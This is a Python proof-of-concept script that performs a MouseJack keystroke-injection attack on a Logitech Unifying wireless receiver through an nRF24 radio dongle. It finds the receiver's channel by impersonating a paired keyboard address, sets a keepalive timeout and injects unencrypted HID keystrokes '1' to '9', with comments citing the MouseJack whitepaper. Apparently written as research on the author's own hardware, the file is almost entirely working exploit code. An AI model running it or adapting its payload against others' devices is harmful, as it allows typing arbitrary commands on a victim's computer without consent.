import time
import sys

'''
Appending the parent folder to sys.path so that we can import a module from a sibling directory (radio_agent).
Simply using a relative import such as: from ..radio_agent import nrf24, would NOT work since any script that uses
explicit relative imports cannot be run directly, but this is a script we want to run.
In addition, this was not enough to make it run inside VS Code so a launch.json file was added, assigning the workspace folder
as the value of the PYTHONPATH environment variable.
'''
sys.path.append('..')
from radio_agent import nrf24

# E4:ED:AE:B8:B4 is an RF address of a Logitech MK345 keyboard that I (Ron) own.
# It MUST be written backwards, because when it's sent to the attacking dongle (by calling enter_sniffer_mode), it is written to some register
# in the nRF24 chip using an SPI command. This can be deduced by following the flow of function calls in the research firmware code, starting here:
# https://github.com/BastilleResearch/nrf-research-firmware/blob/master/src/radio.c#L98
# According to page 53 here: https://www.rcscomponents.kiev.ua/datasheets/nrf24lu1-f16q32-t.pdf, data bytes in SPI commands must be ordered from LSByte to MSByte.
address = [0xB4, 0xB8, 0xAE, 0xED, 0xE4]
#address = [0xA4, 0x0C, 0xA8, 0xAB, 0xFA] # FA:AB:A8:0C:A4 is an RF address of a Logitech MK345 mouse that I (Ron) own

# initialize the radio
radio = nrf24.nrf24()
radio.enable_lna() # low noise amplifier

'''
STEP 1: in order to communicate with the victim dongle, we must identify the frequency channel it uses to communicate with its paired device.
We can pretend to be that device (since we have its address), and repeatedly send an arbitrary "ping" payload to the victim dongle, using a different channel each time.
We do this until an ACK is received from the dongle, meaning we found the right channel.
'''
ping_payload = [0x0F, 0x0F, 0x0F, 0x0F]
print('pinging...')

# We need to enter sniffer mode because this is the only way to tell the attacking dongle which address to use
# when transmitting a payload. Note that this has nothing to do with sniffing keystrokes for keylogging purposes.
radio.enter_sniffer_mode(address)

# The nRF24LU1 chip provides 126 channels of 1MHz from 2400MHz to 2525MHz, so the channel parameter can be between 0 and 125 (inclusive).
# But we don't need to scan all of these channels - the MouseJack whitepaper contains a Radio Configuration table for each affected vendor.
# The tables contain the range of channels used by each vendor. The smallest used frequency among all vendors is 2402, and the greatest one
# is 2481. So we can expect the channels to be between 2 and 81, thus reducing scanning time (for Logitech Unifying, the bound is even tighter -
# 2402 - 2474).
# To be more safe, an upper bound of 84 is used, based on: https://github.com/BastilleResearch/nrf-research-firmware/blob/master/tools/lib/common.py#L33
for channel in range(2, 84):
    radio.set_channel(channel)
    if radio.transmit_payload(ping_payload): # transmitting the payload; the function returns true if a response was received
        print(channel)
        break
    
'''
STEP 2: injecting keystrokes of '1' to '9'. But there is a problem - the dongle and paired device could move to a different channel while we do this,
thus breaking the attack. According to the whitepaper, they remain on the same channel as long as there is no packet loss. To indicate this, the device
sends periodic keepalive packets to its dongle. It has to do so within a known interval/timeout, which is set by the device. If the timeout has passed without
the dongle receiving a keepalive packet from the device, they move to a different channel. In addition, even if all keepalives are delivered on time, but the device is idle,
the keepalive interval/timeout is increased every once in a while. But that's less important.
The whitepaper states that in order to perform a successful attack, "an attacker needs to mimic the keepalive behavior used by Unifying keyboards and mice".
So we first send the dongle a packet that sets a relatively long keepalive timeout, and then transmit keepalives very frequently. This way we can be confident
that there won't be a timeout that would cause the dongle to switch channels unexpectedly.
'''
# function to calculate checksum for Logitech payloads, based on slide 56 of the KeyKeriki project: http://www.remote-exploit.org/content/keykeriki_v2_cansec_v1.1.pdf
def with_checksum(payload): # payload parameter does not include the checksum byte, it is appended to it
    cksum = 0xFF
    for n in range(len(payload)):
        cksum = (cksum - payload[n]) & 0xFF # using bitwise AND with 0xFF in order to make sure the checksum doesn't go negative (and thus exceeds 1 byte)
    cksum = (cksum + 1) & 0xFF # if cksum is 0xFF at this point, then adding 1 will cause it to exceed 1 byte, so doing the same thing
    payload.append(cksum)
    return payload

# refer to: https://gist.github.com/MightyPork/6da26e382a7ad91b5496ee55fdc73db2
hid_scan_codes = {
    '1': 0x1E,
    '2': 0x1F,
    '3': 0x20,
    '4': 0x21,
    '5': 0x22,
    '6': 0x23,
    '7': 0x24,
    '8': 0x25,
    '9': 0x26
}

# transmitting payload that sets the keepalive timeout to 1200ms (=0x4B0)
set_keepalive_timeout = with_checksum([0x00, 0x4F, 0x00, 0x04, 0xB0, 0x00, 0x00, 0x00, 0x00]) # refer to Figure 5 in the MouseJack whitepaper: Logitech Unifying Set Keepalive Timeout Payload
radio.transmit_payload(set_keepalive_timeout)
time.sleep(12 / 1000) # sleeping for 12ms

# the keepalive itself, includes the timeout we set before (refer to Figure 6 in the MouseJack whitepaper: Logitech Unifying Keepalive Payload)
keepalive = with_checksum([0x00, 0x40, 0x04, 0xB0])

# transmitting '1' to '9'
for key in sorted(hid_scan_codes.keys()):
    # refer to Table 8 in the MouseJack whitepaper: Logitech Unencrypted Keystroke Payload
    radio.transmit_payload(with_checksum([0x00, 0xC1, 0x00, hid_scan_codes[key], 0x00, 0x00, 0x00, 0x00, 0x00])) # third byte is always zero because it's the modifier mask (e.g. Ctrl, Shift, Alt...) which we don't need
    time.sleep(12 / 1000) # sleeping for 12ms
    radio.transmit_payload(keepalive) # transmitting keepalive after each keystroke
# at the end, transmitting a key release packet (scan code = 0x00), otherwise it would keep typing '9' forever
radio.transmit_payload(with_checksum([0x00, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]))
